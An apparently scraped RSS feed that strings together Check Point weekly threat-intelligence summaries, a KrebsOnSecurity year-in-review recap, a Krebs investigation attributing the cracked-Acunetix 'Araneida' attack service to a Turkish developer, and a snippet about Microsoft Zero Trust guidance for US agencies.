&lt;li&gt;The European Space Agency&amp;#8217;s (ESA) official merchandise store was &lt;a href="https://www.forbes.com/sites/daveywinder/2024/12/26/hackers-used-christmas-jumpers-to-attack-european-space-agency-shop/" style="font-size: revert;"&gt;hacked&lt;/a&gt;&lt;span style="font-size: revert; color: initial;"&gt;, causing it to display a fake payment page designed to steal customer payment card details.&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A critical SQL injection vulnerability (CVE-2024-45387), rated 9.9 on the CVSS scale, has been &lt;a href="https://securityaffairs.com/172307/security/apache-traffic-control-critical-flaw.html"&gt;identified&lt;/a&gt; in Apache Traffic Control versions 8.0.0 and 8.0.1. The flaw allows privileged users with specific roles to execute arbitrary SQL commands in the database via crafted PUT requests. The issue has been patched in version 8.0.2.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point IPS provides protection against this threat &lt;/em&gt;&lt;em&gt;(Apache Traffic Control SQL Injection (CVE-2024-45387))&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A critical vulnerability (CVE-2024-52046) with a maximum CVSS score of 10.0, has been &lt;a href="https://thehackernews.com/2024/12/apache-mina-cve-2024-52046-cvss-100.html"&gt;discovered&lt;/a&gt; in Apache MINA, a Java network application framework. The flaw arises from the ObjectSerializationDecoder&amp;#8217;s use of Java&amp;#8217;s native deserialization protocol without adequate security measures, enabling attackers to execute remote code by sending malicious serialized data.&lt;/li&gt;
&lt;li&gt;Palo Alto Networks has &lt;a href="https://security.paloaltonetworks.com/CVE-2024-3393"&gt;disclosed&lt;/a&gt; an actively exploited Denial of Service (DoS) vulnerability (CVE-2024-3393) affecting PAN-OS software. The flaw allows unauthenticated attackers to send malicious packets that force affected firewalls into reboot or maintenance mode, disrupting firewall protection. The issue impacts devices with DNS Security logging enabled and has been patched in versions PAN-OS 10.1.14-h8, 10.2.10-h12, 11.1.5, and 11.2.3.&lt;/li&gt;
&lt;li&gt;A high-severity OS command injection vulnerability (CVE-2024-12856) has been &lt;a href="https://vulncheck.com/blog/four-faith-cve-2024-12856"&gt;identified&lt;/a&gt; in Four-Faith router models F3x24 and F3x36. Exploitation via default credentials may enable unauthenticated OS command execution. Over 15,000 internet-facing devices are at risk, with evidence suggesting active exploitation since at least early November 2024.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point IPS provides protection against this threat&lt;/em&gt;&lt;em&gt; (Four-Faith F3x Series Command Injection (CVE-2024-12856))&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Researchers have &lt;a href="https://jp.security.ntt/tech_blog/contagious-interview-ottercookie"&gt;observed&lt;/a&gt; &amp;#8220;OtterCookie&amp;#8221;, a new malware used in the North Korean-associated Contagious Interview campaign. This financially motivated campaign targets a broad range of victims and is active in Japan. OtterCookie communicates via Socket.IO, executes shell commands to exfiltrate sensitive data, including cryptocurrency keys, and uses clipboard data collection to enhance its capabilities.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://bi.zone/eng/expertise/blog/paper-werewolf-sovmeshchaet-kibershpionazh-s-destruktivnymi-deystviyami/"&gt;identified&lt;/a&gt; heightened activity by the Paper Werewolf (aka GOFFEE) cluster, conducting at least seven campaigns targeting Russian organizations since 2022. Using phishing PowerShell and PowerRAT, and emails with malicious macros, the group conducts espionage and destructive ops, including disabling IT infrastructure and changing account credentials. The arsenal includes custom implants, reverse shells, and malicious IIS modules for credential harvesting.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://www.fortinet.com/blog/threat-research/botnets-continue-to-target-aging-d-link-vulnerabilities"&gt;analyzed&lt;/a&gt; the increased activity from botnets like the Mirai variant &amp;#8220;FICORA&amp;#8221; and the Kaiten variant &amp;#8220;CAPSAICIN,&amp;#8221; which exploit long-standing vulnerabilities in D-Link devices to execute malicious commands via the HNAP interface.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; &lt;/p&gt;

&lt;p&gt;KrebsOnSecurity.com turns 15 years old today! Maybe it&amp;#8217;s indelicate to celebrate the birthday of a cybercrime blog that mostly publishes bad news, but happily many of 2024&amp;#8217;s most engrossing security stories were about bad things happening to bad guys. It&amp;#8217;s also an occasion to note that despite my publishing fewer stories than ever this past year, we somehow managed to attract near record levels of readership (thank you!).&lt;/p&gt;
&lt;p&gt;In case you missed any of them, here&amp;#8217;s a recap of 2024&amp;#8217;s most-read stories. In January, KrebsOnSecurity told the story of a Canadian man who was falsely charged with larceny and lost his job after becoming the victim of a &lt;a href="https://krebsonsecurity.com/2024/01/canadian-man-stuck-in-triangle-of-e-commerce-fraud/" rel="noopener" target="_blank"&gt;complex e-commerce scam known as triangulation fraud.&lt;/a&gt; This can occur when you buy something online — from a seller on &lt;strong&gt;Amazon&lt;/strong&gt; or &lt;strong&gt;eBay&lt;/strong&gt;, for example — but the seller doesn’t actually own the item for sale. Instead, they purchase the item using stolen payment card data and your shipping address. In this scam, you receive what you ordered, and the only party left to dispute the transaction is the owner of the stolen payment card.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_32692" style="width: 590px;"&gt;&lt;img alt="" class="size-medium wp-image-32692" height="318" src="https://krebsonsecurity.com/wp-content/uploads/2015/11/triangulationfraud-580x318.png" width="580" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-32692"&gt;Triangulation fraud. Image: eBay Enterprise.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;March featured several investigations into the history of various people-search data broker services. One story exposed how the Belarusian CEO of the privacy and data removal service &lt;strong&gt;OneRep&lt;/strong&gt; had actually &lt;a href="https://krebsonsecurity.com/2024/03/ceo-of-data-privacy-company-onerep-com-founded-dozens-of-people-search-firms/" rel="noopener" target="_blank"&gt;founded dozens of people-search services&lt;/a&gt;, including many that OneRep was offering to remove people from for a fee. That story quickly &lt;a href="https://krebsonsecurity.com/2024/03/mozilla-drops-onerep-after-ceo-admits-to-running-people-search-networks/" rel="noopener" target="_blank"&gt;prompted Mozilla to terminate its partnership with OneRep&lt;/a&gt;, which Mozilla had bundled as a privacy option for Firefox users.&lt;/p&gt;
&lt;p&gt;A story digging into the consumer data broker &lt;strong&gt;Radaris&lt;/strong&gt; &lt;a href="https://krebsonsecurity.com/2024/03/a-close-up-look-at-the-consumer-data-broker-radaris/" rel="noopener" target="_blank"&gt;found its CEO was a fabricated identity&lt;/a&gt;, and that the company&amp;#8217;s founders were Russian brothers in Massachusetts who operated multiple Russian language dating services and affiliate programs, in addition to a dizzying array of people-search websites.&lt;/p&gt;
&lt;p&gt;Radaris repeatedly threatened to sue KrebsOnSecurity unless that publication was retracted in full, alleging that it was replete with errors both factual and malicious. Instead, &lt;a href="https://krebsonsecurity.com/2024/06/krebsonsecurity-threatened-with-defamation-lawsuit-over-fake-radaris-ceo/" rel="noopener" target="_blank"&gt;we doubled down and published all of the supporting evidence&lt;/a&gt; that wasn&amp;#8217;t included in the original story, leaving little room for doubt about its conclusions. Fittingly, Radaris now pimps OneRep as a service when consumers request that their personal information be removed from the data broker&amp;#8217;s website.&lt;/p&gt;
&lt;p&gt;Easily the longest story this year was &lt;a href="https://krebsonsecurity.com/2024/05/stark-industries-solutions-an-iron-hammer-in-the-cloud/" rel="noopener" target="_blank"&gt;an investigation into Stark Industries Solutions&lt;/a&gt;, a large, mysterious new Internet hosting firm that materialized when Russia invaded Ukraine. That piece revealed how Stark was being used as a global proxy network to conceal the true source of cyberattacks and disinformation campaigns against enemies of Russia.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_67471" style="width: 756px;"&gt;&lt;img alt="" class=" wp-image-67471" height="463" src="https://krebsonsecurity.com/wp-content/uploads/2024/05/stark-industries-solutions.png" width="746" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-67471"&gt;The homepage of Stark Industries Solutions.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Much of my summer was spent reporting a story about how advertising and marketing firms have created &lt;a href="https://krebsonsecurity.com/2024/10/the-global-surveillance-free-for-all-in-mobile-ad-data/" rel="noopener" target="_blank"&gt;a global free-for-all where anyone can track the daily movements and associations of hundreds of millions of mobile devices&lt;/a&gt;, thanks to the ubiquity of mobile location data that is broadly and cheaply available.&lt;span id="more-69936"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Research published in September explored &lt;a href="https://krebsonsecurity.com/2024/09/the-dark-nexus-between-harm-groups-and-the-com/" rel="noopener" target="_blank"&gt;the dark nexus between harm groups and cybercrime communities consumed with perpetrating financial fraud&lt;/a&gt;. That analysis found an increasing number of young, Western cybercriminals are also members of fast-growing online groups that exist solely to bully, stalk, harass and extort vulnerable teens into physically harming themselves and others.&lt;/p&gt;
&lt;p&gt;One focus of that story was a Canadian cybercriminal who used the nickname &lt;strong&gt;Judische. &lt;/strong&gt;Identified by the Mandiant as one of the most consequential threat actors of 2024, Judische was responsible for a hacking rampage that exposed private information on hundreds of millions of Americans.  That story withheld Judische&amp;#8217;s real name, but the reporting came in handy in late October when &lt;a href="https://krebsonsecurity.com/2024/11/canadian-man-arrested-in-snowflake-data-extortions/" rel="noopener" target="_blank"&gt;a 25-year-old Canadian man named Connor Riley Moucka was arrested and charged with 20 criminal counts connected to the Snowflake data extortions&lt;/a&gt;.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_69625" style="width: 757px;"&gt;&lt;img alt="" class=" wp-image-69625" height="573" src="https://krebsonsecurity.com/wp-content/uploads/2024/11/moucka-surveillance.png" width="747" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-69625"&gt;A surveillance photo of Connor Riley Moucka, a.k.a. &amp;#8220;Judische&amp;#8221; and &amp;#8220;Waifu,&amp;#8221; dated Oct 21, 2024, 9 days before Moucka&amp;#8217;s arrest. This image was included in an affidavit filed by an investigator with the Royal Canadian Mounted Police (RCMP).&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;In November, KrebsOnSecurity published a profile of Judische&amp;#8217;s accomplice &amp;#8212; a hacker known as &lt;strong&gt;Kiberphant0m&lt;/strong&gt; &amp;#8212; detailing how Kiberphant0m had left a trail of clues strongly suggesting that &lt;a href="https://krebsonsecurity.com/2024/11/hacker-in-snowflake-extortions-may-be-a-u-s-soldier/" rel="noopener" target="_blank"&gt;they are or recently were a U.S. Army soldier stationed in South Korea&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;My reporting in December was mainly split between two investigations. The first profiled &lt;strong&gt;Cryptomus&lt;/strong&gt;, a dodgy cryptocurrency exchange allegedly based in Canada that has become a major payment processor and sanctions evasion platform &lt;a href="https://krebsonsecurity.com/2024/12/how-cryptocurrency-turns-to-cash-in-russian-banks/" rel="noopener" target="_blank"&gt;for dozens of Russian exchanges and cybercrime services online&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://krebsonsecurity.com/2024/12/how-to-lose-a-fortune-with-just-one-bad-click/" rel="noopener" target="_blank"&gt;How to Lose a Fortune with Just One Bad Click&lt;/a&gt; told the sad tales of two cryptocurrency heist victims who were scammed out of six and seven figures after falling for complex social engineering schemes over the phone. In these attacks, the phishers abused at least four different Google services to trick targets into believing they were speaking with a Google representative, and into giving thieves control over their account with a single click. Look for a story here in early 2025 that will explore the internal operations of these ruthless and ephemeral voice phishing gangs.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2024/23rd-december-threat-intelligence-report/"&gt;23rd December – Threat Intelligence Report&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;For the latest discoveries in cyber research for the week of 23rd December, please download our &lt;a href="https://research.checkpoint.com/wp-content/uploads/2024/12/Threat_Intelligence_News_2024-12-23.pdf"&gt;Threat Intelligence Bulletin&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The State of Rhode Island has issued a &lt;a href="https://admin.ri.gov/ribridges-alert"&gt;notification&lt;/a&gt; that RIBridges, the state&amp;#8217;s portal for social services, has suffered a cyber attack and data leak. According to the reports, the breach was likely caused by a ransomware attack, including compromise of personal information of hundreds of thousands of the state&amp;#8217;s residents.&lt;/li&gt;
&lt;li&gt;US identity and access management solutions company, Beyond Trust, has &lt;a href="https://www.beyondtrust.com/remote-support-saas-service-security-investigation"&gt;suffered&lt;/a&gt; a breach affecting its Remote Support product for some its customers. The attackers gained access to a Remote Support API key, which allowed them access to local application accounts.&lt;/li&gt;
&lt;li&gt;Namibia&amp;#8217;s state telecom company, Telecom Namibia, has &lt;a href="https://www.bbc.com/news/articles/ce3l509e6x7o"&gt;suffered&lt;/a&gt; a ransomware attack. According to reports, the company was breached by the ransomware group Hunters International, which has stolen more than 600GB of data.&lt;/li&gt;
&lt;li&gt;Healthcare software company Phreesia &lt;a href="https://www.bleepingcomputer.com/news/security/connectoncall-breach-exposes-health-data-of-over-910-000-patients/"&gt;disclosed&lt;/a&gt; a breach of its subsidiary, ConnectOnCall, impacting 914,138 patients&amp;#8217; personal and health data. The breach occurred between February and May 2024, allowing unauthorized access to personal identifiable information and medical records. The compromised data involved communications between patients and healthcare providers.&lt;/li&gt;
&lt;li&gt;Ukrainian Justice Ministry &lt;a href="https://www.reuters.com/technology/cybersecurity/ukraine-says-russian-cyberattack-hits-state-registries-no-data-lost-2024-12-20/"&gt;suffered&lt;/a&gt; a cyber attack by Russia-linked actors that shutdown various online services. The threat actors prepared the cyberattack through several months, while the Ukrainian security service&amp;#8217;s cyber department attribute the attack to the Russian military intelligence (GRU).&lt;/li&gt;
&lt;li&gt;The Texas Tech University Health Sciences Center has &lt;a href="https://www.bleepingcomputer.com/news/security/texas-tech-university-system-data-breach-impacts-14-million-patients/"&gt;disclosed&lt;/a&gt; a ransomware attack that occurred in September and caused disruption of some systems and applications. The attack resulted in extraction of the combined data of 1,465,000 people that include personal identifiable information, financial details and medical data. Interlock ransomware claimed credit for the attack.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Threat Emulation and Harmony Endpoint provide protection against this threat&lt;/em&gt; &lt;em&gt;(Ransomware.Win.Interlock)&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ascension Health ransomware attack &lt;a href="https://www.bleepingcomputer.com/news/security/ascension-health-data-of-56-million-stolen-in-ransomware-attack/"&gt;resulted&lt;/a&gt; in exposure of 5.6 million people’s data. Black Basta ransomware targeted Ascension in May, disrupting operations for weeks. Recently Ascension confirmed that the attackers extracted medical records, financial data and personal identifiable information.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Threat Emulation and Harmony Endpoint provide protection against this threat &lt;/em&gt;&lt;em&gt;(Ransomware.Win.BlackBasta)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Google has &lt;a href="https://chromereleases.googleblog.com/2024/12/stable-channel-update-for-desktop_18.html"&gt;released&lt;/a&gt; a security update for Google Chrome, addressing five security vulnerabilities. One of the vulnerabilities, CVE-2024-12692, is a high severity type confusion vulnerability. This vulnerability was reported to Google on December 5&lt;sup&gt;th&lt;/sup&gt; and could lead to heap corruption via a crafted HTML page.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://unit42.paloaltonetworks.com/azure-data-factory-apache-airflow-vulnerabilities/"&gt;identified&lt;/a&gt; vulnerabilities in Azure Data Factory’s Apache Airflow integration that could allow attackers to gain unauthorized access. The flaws include misconfigured Kubernetes RBAC, weak authentication in Azure’s internal Geneva service, and secret handling issues. Exploitation of these issues could lead to access, data exfiltration, and malware deployment.&lt;/li&gt;
&lt;li&gt;Severe security vulnerability was &lt;a href="https://www.securityweek.com/fortinet-patches-critical-fortiwlm-vulnerability/"&gt;discovered&lt;/a&gt; in FortiWLM Wireless Manager. This vulnerability (CVE-2023-34990) enables remote code execution through unauthorized access to log files and critical system files enabled by relative path traversal.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point IPS blade provides protection against this threat &lt;/em&gt;&lt;em&gt;(Web Servers Malicious URL Directory Traversal)&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The Australian Cyber Security Center (ACSC) has &lt;a href="https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/critical-security-vulnerability-affecting-apache-struts2-below-6-4-0"&gt;alerted&lt;/a&gt; organizations to a critical vulnerability in Apache Struts2 before version 6.4.0, which largely affects Java-based applications. The file upload flaw (CVE-2024-53677) can lead to extensive security breaches, including remote code execution, by exploiting path traversal flaws and manipulating file upload parameters.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point IPS blade provides protection against this threat (Java Server Pages Backdoor)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point researchers &lt;a href="https://blog.checkpoint.com/securing-user-and-access/google-calendar-notifications-bypassing-email-security-policies/"&gt;discovered&lt;/a&gt; a phishing campaign abusing Google Calendar and Google Drawings to bypass email security. Attackers manipulate email headers to impersonate Google Calendar notifications, tricking users into visiting malicious pages that steal sensitive data for financial scams.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://www.reversinglabs.com/blog/a-new-playground-malicious-campaigns-proliferate-from-vscode-to-npm"&gt;identified&lt;/a&gt; a campaign of malicious extensions targeting integrated development environment (IDE) software VSCode. Initially targeting crypto community, the latest malicious extensions all impersonate Zoom application. The campaign was also expanded to NPM package manager, introducing malicious JavaScript packages.&lt;/li&gt;
&lt;li&gt;Researchers &lt;a href="https://unit42.paloaltonetworks.com/european-phishing-campaign/"&gt;found&lt;/a&gt; that threat actors abused a legitimate tool for leads generation to harvest Microsoft Azure credentials. The threat actors targeted automotive, chemical and manufacturing industries with fake forms created through HubSpot Free Form Builder service that consequently redirected to attacker-controlled phishing domains, impersonating Outlook Web Application.&lt;/li&gt;
&lt;li&gt;Researchers &lt;a href="https://securelist.com/lazarus-new-malware/115059/"&gt;report&lt;/a&gt; on evolution of tools, techniques and procedures (TTPs) of North Korean hacking group Lazarus. In their latest attacks targeting the nuclear sector, the group introduced CookiePlus, a novel framework malware capable of downloading DLL and shellcode. &lt;/li&gt;
&lt;/ul&gt;

The cracked software is being resold as a cloud-based attack tool by at least two different services, one of which KrebsOnSecurity traced to an information technology firm based in Turkey.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_69895" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-69895" height="562" src="https://krebsonsecurity.com/wp-content/uploads/2024/12/araneida-scanner.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-69895"&gt;Araneida Scanner.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Cyber threat analysts at &lt;strong&gt;Silent Push&lt;/strong&gt; said they recently received reports from a partner organization that identified an aggressive scanning effort against their website using an Internet address previously associated with a campaign by &lt;a href="https://resources.prodaft.com/fin7-cybercrime-gang" rel="noopener" target="_blank"&gt;FIN7&lt;/a&gt;, a notorious Russia-based hacking group.&lt;/p&gt;
&lt;p&gt;But on closer inspection they discovered the address contained an HTML title of &amp;#8220;&lt;strong&gt;Araneida Customer Panel&lt;/strong&gt;,&amp;#8221; and found they could search on that text string to find dozens of unique addresses hosting the same service.&lt;/p&gt;
&lt;p&gt;It soon became apparent that Araneida was being resold as a cloud-based service using a cracked version of Acunetix, allowing paying customers to conduct offensive reconnaissance on potential target websites, scrape user data, and find vulnerabilities for exploitation.&lt;/p&gt;
&lt;p&gt;Silent Push also learned Araneida bundles its service with a robust proxy offering, so that customer scans appear to come from Internet addresses that are randomly selected from a large pool of available traffic relays.&lt;/p&gt;
&lt;p&gt;The makers of Acunetix, Texas-based application security vendor &lt;strong&gt;Invicti Security&lt;/strong&gt;, confirmed Silent Push&amp;#8217;s findings, saying someone had figured out how to crack the free trial version of the software so that it runs without a valid license key.&lt;/p&gt;
&lt;p&gt;&amp;#8220;We have been playing cat and mouse for a while with these guys,&amp;#8221; said &lt;strong&gt;Matt Sciberras&lt;/strong&gt;, chief information security officer at Invicti.&lt;/p&gt;
&lt;p&gt;Silent Push said Araneida is being advertised by an eponymous user on multiple cybercrime forums. The service&amp;#8217;s Telegram channel boasts nearly 500 subscribers and explains how to use the tool for malicious purposes.&lt;/p&gt;
&lt;p&gt;In a &amp;#8220;Fun Facts&amp;#8221; list posted to the channel in late September, Araneida said their service was used to take over more than 30,000 websites in just six months, and that one customer used it to buy a Porsche with the payment card data (&amp;#8220;dumps&amp;#8221;) they sold.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_69898" style="width: 668px;"&gt;&lt;img alt="" class=" wp-image-69898" height="273" src="https://krebsonsecurity.com/wp-content/uploads/2024/12/araneida-tg.png" width="658" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-69898"&gt;Araneida Scanner&amp;#8217;s Telegram channel bragging about how customers are using the service for cybercrime.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;“They are constantly bragging with their community about the crimes that are being committed, how it’s making criminals money,” said &lt;strong&gt;Zach Edwards&lt;/strong&gt;, a senior threat researcher at Silent Push. “They are also selling bulk data and dumps which appear to have been acquired with this tool or due to vulnerabilities found with the tool.”&lt;/p&gt;
&lt;p&gt;Silent Push also found a cracked version of Acunetix was powering at least 20 instances of a similar cloud-based vulnerability testing service catering to Mandarin speakers, but they were unable to find any apparently related sales threads about them on the dark web.&lt;/p&gt;
&lt;p&gt;Rumors of a cracked version of Acunetix being used by attackers surfaced &lt;a href="https://x.com/FalconFeedsio/status/1665690661377691649" rel="noopener" target="_blank"&gt;in June 2023 on Twitter/X&lt;/a&gt;, when researchers &lt;a href="https://x.com/TLP_R3D/status/1665777020767293447" rel="noopener" target="_blank"&gt;first posited a connection between observed scanning activity and Araneida&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;According to &lt;a href="https://www.hhs.gov/sites/default/files/china-based-threat-actor-profiles-tlpclear.pdf" rel="noopener" target="_blank"&gt;an August 2023 report&lt;/a&gt; (PDF) from the &lt;strong&gt;U.S. Department of Health and Human Services&lt;/strong&gt; (HHS), Acunetix (presumably a cracked version) is among several tools used by &lt;a href="https://krebsonsecurity.com/2020/09/chinese-antivirus-firm-was-part-of-apt41-supply-chain-attack/" rel="noopener" target="_blank"&gt;APT 41&lt;/a&gt;, a prolific Chinese state-sponsored hacking group.&lt;span id="more-69811"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;THE TURKISH CONNECTION&lt;/h2&gt;
&lt;p&gt;Silent Push notes that the website where Araneida is being sold &amp;#8212; &lt;strong&gt;araneida[.]co&lt;/strong&gt; &amp;#8212; first came online in February 2023. But a review of this Araneida nickname on the cybercrime forums shows they have been active in the criminal hacking scene since at least 2018.&lt;/p&gt;
&lt;p&gt;A search in the threat intelligence platform &lt;a href="https://www.intel471.com" rel="noopener" target="_blank"&gt;Intel 471&lt;/a&gt; shows a user by the name Araneida promoted the scanner on two cybercrime forums since 2022, including &lt;strong&gt;Breached&lt;/strong&gt; and &lt;strong&gt;Nulled&lt;/strong&gt;. In 2022, Araneida told fellow Breached members they could be reached on Discord at the username &amp;#8220;&lt;strong&gt;Ornie#9811&lt;/strong&gt;.&amp;#8221;&lt;/p&gt;
&lt;p&gt;According to Intel 471, this same Discord account was advertised in 2019 by a person on the cybercrime forum &lt;strong&gt;Cracked&lt;/strong&gt; who used the monikers &amp;#8220;&lt;strong&gt;ORN&lt;/strong&gt;&amp;#8221; and &amp;#8220;&lt;strong&gt;ori0n&lt;/strong&gt;.&amp;#8221; The user &amp;#8220;ori0n&amp;#8221; mentioned in several posts that they could be reached on Telegram at the username &amp;#8220;&lt;strong&gt;@sirorny&lt;/strong&gt;.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_69912" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-69912" height="411" src="https://krebsonsecurity.com/wp-content/uploads/2024/12/orn-araneida.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-69912"&gt;Orn advertising Araneida Scanner in Feb. 2023 on the forum Cracked. Image: Ke-la.com.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;The Sirorny Telegram identity also was referenced as a point of contact for a current user on the cybercrime forum Nulled who is selling website development services, and who references araneida[.]co as one of their projects. That user, &amp;#8220;&lt;strong&gt;Exorn&lt;/strong&gt;,&amp;#8221; has posts dating back to August 2018.&lt;/p&gt;
&lt;p&gt;In early 2020, Exorn promoted a website called &amp;#8220;&lt;strong&gt;orndorks[.]com&lt;/strong&gt;,&amp;#8221; which they described as a service for automating the scanning for web-based vulnerabilities. A passive DNS lookup on this domain at &lt;a href="https://www.domaintools.com" rel="noopener" target="_blank"&gt;DomainTools.com&lt;/a&gt; shows that its email records pointed to the address &lt;strong&gt;ori0nbusiness@protonmail.com&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.constella.ai" rel="noopener" target="_blank"&gt;Constella Intelligence&lt;/a&gt;, a company that tracks information exposed in data breaches, finds this email address was used to register an account at &lt;strong&gt;Breachforums&lt;/strong&gt; in July 2024 under the nickname &amp;#8220;&lt;strong&gt;Ornie&lt;/strong&gt;.&amp;#8221; Constella also finds the same email registered at the website netguard[.]codes in 2021 using the password &amp;#8220;&lt;strong&gt;ceza2003&lt;/strong&gt;&amp;#8221; [full disclosure: Constella is currently an advertiser on KrebsOnSecurity].&lt;/p&gt;
&lt;p&gt;A search on the password ceza2003 in Constella finds roughly a dozen email addresses that used it in an exposed data breach, most of them featuring some variation on the name &amp;#8220;&lt;strong&gt;altugsara&lt;/strong&gt;,&amp;#8221; including &lt;strong&gt;altugsara321@gmail.com&lt;/strong&gt;. Constella further finds altugsara321@gmail.com was used to create an account at the cybercrime community &lt;strong&gt;RaidForums&lt;/strong&gt; under the username &amp;#8220;&lt;strong&gt;ori0n&lt;/strong&gt;,&amp;#8221; from an Internet address in Istanbul.&lt;/p&gt;
&lt;p&gt;According to DomainTools, altugsara321@gmail.com was used in 2020 to register the domain name &lt;strong&gt;altugsara[.]com&lt;/strong&gt;. &lt;a href="https://web.archive.org/web/20211125114845/http://altugsara.com/" rel="noopener" target="_blank"&gt;Archive.org&amp;#8217;s history for that domain&lt;/a&gt; shows that in 2021 it featured a website for a then 18-year-old &lt;strong&gt;Altuğ Şara&lt;/strong&gt; from Ankara, Turkey.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_69893" style="width: 759px;"&gt;&lt;img alt="" class="size-full wp-image-69893" height="345" src="https://krebsonsecurity.com/wp-content/uploads/2024/12/altugsaradotcom.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-69893"&gt;Archive.org&amp;#8217;s recollection of what altugsara dot com looked like in 2021.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;LinkedIn&lt;/strong&gt; finds this same &lt;strong&gt;altugsara[.]com&lt;/strong&gt; domain listed in the &amp;#8220;contact info&amp;#8221; section of &lt;a href="https://www.linkedin.com/in/altu%C4%9F-%C5%9Fara-58957b212/" rel="noopener" target="_blank"&gt;a profile&lt;/a&gt; for an &lt;strong&gt;Altug Sara&lt;/strong&gt; from Ankara, who says he has worked the past two years as a senior software developer for a Turkish IT firm called &lt;strong&gt;Bilitro Yazilim&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Neither Altug Sara nor Bilitro Yazilim responded to requests for comment.&lt;/p&gt;
&lt;p&gt;Invicti&amp;#8217;s website states that it has offices in Ankara, but the company&amp;#8217;s CEO said none of their employees recognized either name.&lt;/p&gt;
&lt;p&gt;&amp;#8220;We do have a small team in Ankara, but as far as I know we have no connection to the individual other than the fact that they are also in Ankara,&amp;#8221; Invicti CEO &lt;strong&gt;Neil Roseman&lt;/strong&gt; told KrebsOnSecurity.&lt;/p&gt;
&lt;p&gt;Researchers at Silent Push say despite Araneida using a seemingly endless supply of proxies to mask the true location of its users, it is a fairly &amp;#8220;noisy&amp;#8221; scanner that will kick off a large volume of requests to various API endpoints, and make requests to random URLs associated with different content management systems.&lt;/p&gt;
&lt;p&gt;What&amp;#8217;s more, the cracked version of Acunetix being resold to cybercriminals invokes legacy Acunetix SSL certificates on active control panels, which Silent Push says provides a solid pivot for finding some of this infrastructure, particularly from the Chinese threat actors.&lt;/p&gt;

In April of 2024, we released &lt;a href="https://aka.ms/ZTforDoD"&gt;Microsoft guidance for the Department of Defense Zero Trust Strategy&lt;/a&gt;. And now, we are excited to share new &lt;a href="https://aka.ms/ZTforUSGov"&gt;Microsoft Guidance for CISA Zero Trust Maturity Model&lt;/a&gt;. Our guidance is designed to help United States government agencies and their industry partners configure Microsoft cloud services as they transition to &lt;a href="https://www.microsoft.com/security/business/zero-trust"&gt;Zero Trust&lt;/a&gt;, on their journey to achieve advanced and optimal security.&lt;/p&gt;



